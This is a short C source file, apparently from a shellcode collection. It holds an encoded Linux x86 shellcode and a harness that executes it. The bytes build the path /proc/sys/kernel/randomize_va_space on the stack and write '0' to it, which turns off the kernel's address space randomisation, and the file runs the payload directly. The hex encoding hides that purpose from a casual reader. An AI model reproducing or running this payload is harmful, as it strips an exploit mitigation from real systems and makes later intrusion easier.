/*
Author:	  evoche
License:  GPL
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\x31\xc0\x50\xc7\x44\x24\xfc\x70\x61\x63\x65\xbe\x65\x50\x4e\x62\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xf8\xbf\x93\x6a\xc8\x7f\x81\xf7\xfa\x10\xad\x20\x89\x7c\x24\xf4\x83\xec\x0c\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\x31\xf6\xbe\x5e\x5e\xe0\xe4\xd1\xee\x89\x74\x24\xfc\x83\xec\x04\x89\xe3\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x99\xb2\x01\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x6a\x01\x58\xcd\x80";

main()
{	
	printf("Shellcode Length:  %d\n", strlen(code));	
	int (*ret)() = (int(*)())code;
	ret();
}


	